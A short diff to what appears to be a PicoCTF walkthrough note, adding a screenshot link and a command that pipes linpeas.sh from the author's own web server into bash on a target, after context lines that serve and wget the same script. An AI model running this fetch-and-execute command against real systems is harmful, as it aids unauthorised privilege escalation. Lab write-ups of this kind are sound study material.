@@ -351,3 +351,10 @@ python3 -m http.server
 ```
 wget ipofmymachine:8000/linpeas.sh
 ```
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260221124505.png)
+
+
+```
+	curl ipofmymachine:8000/linpeas.sh | bash
+```
